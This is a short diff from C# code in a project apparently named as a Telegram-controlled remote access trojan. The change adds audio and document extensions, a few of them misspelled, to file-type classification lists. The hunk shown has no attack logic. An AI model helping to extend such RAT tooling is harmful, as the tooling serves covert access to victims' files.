@@ -457,8 +457,8 @@ namespace RAT_BotTelegram {
             // Convierte la extensión en minuscula.
             dir = dir.ToLower();
             String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv", "3gp" };
-            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
-            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
+            String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a", "flac" };
+            String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf", "xlxs", "xlx", "psd", "csv" };
             String[] imagen = { "jpg", "jpeg", "png", "bmp", "ico", "jpe", "jpe" };
             String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                 "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
